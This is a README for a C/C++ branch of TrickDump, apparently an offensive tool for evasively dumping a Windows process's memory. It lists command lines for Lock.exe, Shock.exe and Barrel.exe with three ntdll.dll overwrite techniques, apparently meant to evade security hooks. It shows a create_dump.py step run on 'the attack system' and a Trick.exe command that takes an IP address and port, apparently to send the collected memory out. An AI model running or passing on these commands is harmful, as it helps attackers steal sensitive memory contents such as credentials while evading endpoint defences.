# TrickDump - "c-flavour" branch

This branch implements the same functionality as the main branch but using C/C++.

```
Lock.exe [disk/knowndlls/debugproc]
```

```
Shock.exe [disk/knowndlls/debugproc]
```

```
Barrel.exe [disk/knowndlls/debugproc]
```

You can execute the programs directly without overwriting the ntdll.dll library:

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_C1.png)

Or use one of the three different overwrite techniques:

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_C2.png)

Then use the *create_dump.py* script to generate the Minidump file in the attack system:

```
python3 create_dump.py [-l LOCK_JSON] [-s SHOCK_JSON] [-b BARREL_JSON] [-z BARREL_ZIP] [-o OUTPUT_FILE]
```

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_C3.png)


-------------------------

## All in one

If you prefer to execute only one binary, Trick.exe generates a ZIP file containing the 3 JSON files and the ZIP file with the memory regions:

```
Trick.exe [disk/knowndlls/debugproc] [IP_ADDRESS] [PORT]
```

It creates the ZIP file locally, optionally using a Ntdll overwrite method:

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_C4.png)

With a ZIP file like this, unzip it and create the Minidump file using *create_dump.py*:

![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_7.png)
